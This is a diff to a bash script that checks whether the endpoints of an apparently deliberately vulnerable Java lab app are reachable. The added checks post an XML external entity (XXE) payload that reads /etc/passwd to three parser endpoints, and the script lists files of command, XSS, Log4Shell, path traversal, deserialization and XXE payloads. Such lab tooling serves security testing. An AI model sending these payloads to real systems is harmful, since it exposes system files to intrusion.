@@ -182,6 +182,34 @@ else
     echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
 fi
 
+
+# 18. XMLReader XXE
+echo -e "\n【18】XMLReader XXE"
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/xxe/xmlReader/vuln" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
+if [ "$HTTP_CODE" = "200" ]; then
+    echo -e "$PASS 端点可用 - XMLReader XXE"
+else
+    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
+fi
+
+# 19. SAXBuilder XXE
+echo -e "\n【19】SAXBuilder XXE (JDOM2)"
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/xxe/saxBuilder/vuln" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
+if [ "$HTTP_CODE" = "200" ]; then
+    echo -e "$PASS 端点可用 - SAXBuilder XXE"
+else
+    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
+fi
+
+# 20. DocumentBuilder XXE
+echo -e "\n【20】DocumentBuilder XXE"
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/xxe/documentBuilder/vuln" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>')
+if [ "$HTTP_CODE" = "200" ]; then
+    echo -e "$PASS 端点可用 - DocumentBuilder XXE"
+else
+    echo -e "$FAIL 端点不存在 (HTTP $HTTP_CODE)"
+fi
+
 echo ""
 echo "========================================"
 echo "   验证完成"
@@ -194,5 +222,6 @@ echo "  - cmd_payloads.txt"
 echo "  - xss_payloads.txt"
 echo "  - log4shell_payloads.txt"
 echo "  - path_traversal_payloads.txt"
-echo "  - deserialize_payloads.txt (新增)"
+echo "  - deserialize_payloads.txt"
+echo "  - xxe_payloads.txt (新增)"
 echo ""
